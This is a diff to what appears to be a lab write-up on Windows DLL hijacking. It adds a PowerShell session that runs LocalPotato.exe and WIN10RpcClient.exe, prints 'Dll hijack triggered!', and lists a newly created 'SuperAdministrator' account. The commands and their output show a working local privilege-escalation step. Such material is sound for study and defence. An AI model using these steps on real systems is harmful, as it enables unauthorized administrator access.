@@ -82,10 +82,20 @@ certain libraries, even though these libraries were never present on the system.
 
 ---
 
-## Compiling the dll:
+## Hijacking DLL:
 
 > Downloaded the SprintCSP.dll and .exe file. Copy it the dll into \Confluence\bin, and execute the .exe file.
 
 ```powershell
- Get-Process | Where-Object {$_.Description -like "*Confluence*" -or $_.Description -like "*Tomcat*"}
+PS C:\Users\Student\Downloads> . .\LocalPotato.exe
+PS C:\Users\Student\Downloads> . '.\WIN10RpcClient.exe'
+[+] Dll hijack triggered!
+PS C:\Users\Student\Downloads> net users
+User accounts for \\DESKTOP-V9578RL
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+Student                  SuperAdministrator       WDAGUtilityAccount
+
+The command completed successfully.
+PS C:\Users\Student\Downloads>    
 ```
